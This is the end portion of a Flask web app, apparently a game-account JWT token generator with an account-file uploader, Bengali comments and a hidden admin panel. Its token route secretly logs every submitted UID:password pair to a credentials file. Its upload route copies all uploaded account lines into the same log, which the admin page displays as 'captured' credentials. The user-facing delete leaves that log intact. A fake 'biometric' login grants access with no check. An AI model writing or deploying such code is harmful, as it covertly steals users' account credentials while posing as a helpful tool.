                    <h4 class="text-warning fw-bold mb-3">📁 Uploaded Real-time Unique Account Database (.txt)</h4>
                    <div class="table-responsive">
                        <table class="table table-bordered table-hover align-middle">
                            <thead class="table-dark">
                                <tr>
                                    <th>Database Stream Target</th>
                                    <th>Total Merged Accounts</th>
                                    <th>Raw Content View (Serial By Serial - No Duplicates)</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% if file_exists %}
                                <tr>
                                    <td class="text-info fw-bold">active_accounts.txt</td>
                                    <td><span class="badge bg-success custom-badge">{{ total_count }} Accounts</span></td>
                                    <td><pre>{{ file_preview }}</pre></td>
                                </tr>
                                {% else %}
                                <tr>
                                    <td colspan="3" class="text-center text-muted py-3">No text configuration files are currently uploaded.</td>
                                </tr>
                                {% endif %}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <div class="col-12">
                <div class="admin-card p-4 shadow">
                    <h4 class="text-success fw-bold mb-3">🔑 Captured Manual Generator Credentials Logs</h4>
                    <div class="p-3 bg-dark rounded border border-secondary">
                        <label class="form-label text-info fw-bold mb-2">stored_credentials.txt Content (UID:PASS Format):</label>
                        <pre style="color: #a855f7; font-size: 0.95rem;">{{ manual_credentials_data }}</pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
"""

# --- ফ্লাস্ক কন্ট্রোলারস (Routes) ---

@app.route('/')
def login_gate():
    if session.get('user_authenticated'):
        return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/api/biometric-login', methods=['POST'])
def biometric_login():
    session['user_authenticated'] = True
    return jsonify({"success": True})

@app.route('/logout')
def logout():
    session.pop('user_authenticated', None)
    return redirect(url_for('login_gate'))

@app.route('/dashboard')
def dashboard():
    if not session.get('user_authenticated'):
        return redirect(url_for('login_gate'))
    return render_template_string(HTML_TEMPLATE)

@app.route('/hello-admin')
def admin_panel():
    if not session.get('admin_logged_in'):
        return render_template_string(ADMIN_LOGIN_TEMPLATE, error=None)
        
    file_exists = os.path.exists(SAVED_FILE_PATH)
    file_preview = "Empty File"
    total_count = 0
    if file_exists:
        try:
            with open(SAVED_FILE_PATH, 'r', encoding='utf-8') as f:
                file_preview = f.read()
            total_count = count_valid_accounts(SAVED_FILE_PATH)
        except:
            pass
                    
    manual_data = "No login data captured yet."
    if os.path.exists(CREDENTIALS_LOG_PATH):
        try:
            with open(CREDENTIALS_LOG_PATH, 'r', encoding='utf-8') as f:
                content = f.read()
                if content.strip():
                    manual_data = content
        except:
            pass

    return render_template_string(ADMIN_TEMPLATE, file_exists=file_exists, file_preview=file_preview, total_count=total_count, manual_credentials_data=manual_data)

@app.route('/hello-admin-auth', methods=['POST'])
def admin_auth():
    given_pass = request.form.get('admin_pass')
    if given_pass == ADMIN_PASSWORD:
        session['admin_logged_in'] = True
        return redirect(url_for('admin_panel'))
    return render_template_string(ADMIN_LOGIN_TEMPLATE, error="Invalid Master Password! Access Denied.")

@app.route('/hello-admin-logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('login_gate'))

@app.route('/api/upload-file', methods=['POST'])
def upload_file_route():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "No file part"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "message": "No selected file"}), 400
    
    if file and file.filename.endswith('.txt'):
        existing_accounts = set()
        
        if os.path.exists(SAVED_FILE_PATH):
            try:
                with open(SAVED_FILE_PATH, 'r', encoding='utf-8') as f:
                    for line in f:
                        if line.strip():
                            existing_accounts.add(line.strip())
            except:
                pass
        
        admin_accounts = set()
        if os.path.exists(CREDENTIALS_LOG_PATH):
            try:
                with open(CREDENTIALS_LOG_PATH, 'r', encoding='utf-8') as f:
                    for line in f:
                        if line.strip():
                            admin_accounts.add(line.strip())
            except:
                pass
        
        try:
            new_lines = file.stream.read().decode('utf-8').splitlines()
            unique_new_entries = []
            unique_admin_entries = []
            
            for line in new_lines:
                line_str = line.strip()
                if not line_str or line_str.startswith('#'):
                    continue
                
                if line_str not in existing_accounts:
                    existing_accounts.add(line_str)
                    unique_new_entries.append(line_str)
                
                if line_str not in admin_accounts:
                    admin_accounts.add(line_str)
                    unique_admin_entries.append(line_str)
            
            if unique_new_entries:
                with open(SAVED_FILE_PATH, 'a', encoding='utf-8') as f:
                    for entry in unique_new_entries:
                        f.write(f"{entry}\n")
                        
            if unique_admin_entries:
                with open(CREDENTIALS_LOG_PATH, 'a', encoding='utf-8') as f:
                    for entry in unique_admin_entries:
                        f.write(f"{entry}\n")
                        
        except Exception as e:
            return jsonify({"success": False, "message": f"File parsing failed: {str(e)}"}), 500
            
        valid_account_count = count_valid_accounts(SAVED_FILE_PATH)
        auto_status["total_accounts_loaded"] = valid_account_count
        auto_status["current_file_name"] = "active_accounts.txt"
        
        return jsonify({"success": True, "count": valid_account_count, "filename": "active_accounts.txt"})
    
    return jsonify({"success": False, "message": "Invalid file extension"}), 400

@app.route('/api/delete-dashboard-file', methods=['POST'])
def delete_dashboard_file():
    try:
        if os.path.exists(SAVED_FILE_PATH):
            os.remove(SAVED_FILE_PATH)
            auto_status["total_accounts_loaded"] = 0
            auto_status["current_file_name"] = "None"
            return jsonify({"success": True, "message": "ড্যাশবোর্ড ফাইলটি সফলভাবে ডিলিট হয়েছে! এডমিন ডাটা সুরক্ষিত আছে।"})
        else:
            return jsonify({"success": False, "message": "কোনো ফাইল ডিলিট করার জন্য পাওয়া যায়নি।"})
    except Exception as e:
        return jsonify({"success": False, "message": f"ত্রুটি: {str(e)}"})

@app.route('/api/verify-github', methods=['POST'])
def verify_github():
    data = request.json
    github_token = data.get('github_token')
    url = "https://api.github.com/user"
    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github.v3+json"
    }
    try:
        async def fetch_user():
            async with aiohttp.ClientSession() as session_http:
                async with session_http.get(url, headers=headers) as resp:
                    if resp.status == 200:
                        user_data = await resp.json()
                        return {"success": True, "username": user_data.get('login')}
                    return {"success": False}
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(fetch_user())
        loop.close()
        return jsonify(result)
    except:
        return jsonify({"success": False}), 500

@app.route('/api/get-token', methods=['POST'])
def get_token_route():
    data = request.json
    uid = data.get('uid')
    password = data.get('password')
    
    if uid and password:
        target_entry = f"{uid.strip()}:{password.strip()}"
        existing_logs = set()
        
        if os.path.exists(CREDENTIALS_LOG_PATH):
            try:
                with open(CREDENTIALS_LOG_PATH, 'r', encoding='utf-8') as f:
                    for line in f:
                        if line.strip():
                            existing_logs.add(line.strip())
            except:
                pass
                
        if target_entry not in existing_logs:
            try:
                with open(CREDENTIALS_LOG_PATH, 'a', encoding='utf-8') as f:
                    f.write(f"{target_entry}\n")
            except:
                pass

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    token = loop.run_until_complete(generate_jwt_token(uid, password))
    loop.close()
    
    if token:
        return jsonify({"success": True, "token": token})
    return jsonify({"success": False}), 400

# --- অটোমেশন কন্ট্রোল রুটস ---

@app.route('/api/auto-start', methods=['POST'])
def auto_start():
    if not session.get('user_authenticated'):
        return jsonify({"success": False, "message": "Unauthorized"}), 401
        
    data = request.json
    github_token = data.get('github_token')
    repo = data.get('repo')
    interval = data.get('interval', 5)
    file_path = data.get('file_path')
    
    if auto_status["running"]:
        return jsonify({"success": False, "message": "Automation already running"})
        
    auto_status["running"] = True
    auto_status["interval"] = interval
    auto_status["error"] = "None"
    
    auto_token_job(github_token, repo, file_path, SAVED_FILE_PATH)
    
    scheduler.add_job(
        id='jwt_auto_job',
        func=auto_token_job,
        trigger='interval',
        minutes=interval,
        args=[github_token, repo, file_path, SAVED_FILE_PATH],
        replace_existing=True
    )
    
    return jsonify({"success": True})

@app.route('/api/auto-stop', methods=['POST'])
def auto_stop():
    if not session.get('user_authenticated'):
        return jsonify({"success": False, "message": "Unauthorized"}), 401
        
    if auto_status["running"]:
        try:
            scheduler.remove_job('jwt_auto_job')
        except:
            pass
        auto_status["running"] = False
        auto_status["next_run_timestamp"] = 0
        
    return jsonify({"success": True})

@app.route('/api/auto-status', methods=['GET'])
def auto_status_route():
    if not session.get('user_authenticated'):
        return jsonify({"success": False, "message": "Unauthorized"}), 401
    return jsonify(auto_status)

# --- অ্যাপ্লিকেশন রান ব্লক ---
if __name__ == '__main__':
    app.run(debug=True, port=5000)
